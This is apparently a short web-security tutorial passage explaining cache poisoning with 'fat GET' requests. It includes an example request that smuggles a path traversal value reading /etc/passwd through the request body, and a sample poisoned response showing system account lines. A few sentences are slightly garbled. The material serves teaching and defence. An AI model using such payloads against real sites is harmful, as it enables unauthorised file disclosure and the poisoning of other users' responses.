A "fat GET" request is a `GET` request that includes a request body. By sending this type of `GET` request, an attacker can force the caching system to cache a response that contains an attacker-controlled value. If the request body is unkeyed and included in the response, it can create an opportunity for cache poisoning.

If a legitimate user then makes a regular GET request that matches the same cache key, they would receive the poisoned response from the cache, resulting in various vulnerabilities.

In some cases, it may also be possible to use the `X-HTTP-Method-Override` header to trick the application into treating a fat `GET` request as a normal `POST` request.

Below is an example of a fat GET request, since the response is unkeyed and included in the response, the cache will be poisoned:
```http
GET /download?filename=file.php HTTP/1.1
Host: target-website.com
...

filename=../../../../../etc/passwd
```
If a legitimate user then requests a regular GET request using the following:
```http
GET /download?filename=file.php HTTP/1.1
Host: target-website.com
...
```
They would then get the following response, since:
```http
HTTP/1.1 200 OK
...

...[FILE DATA]...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```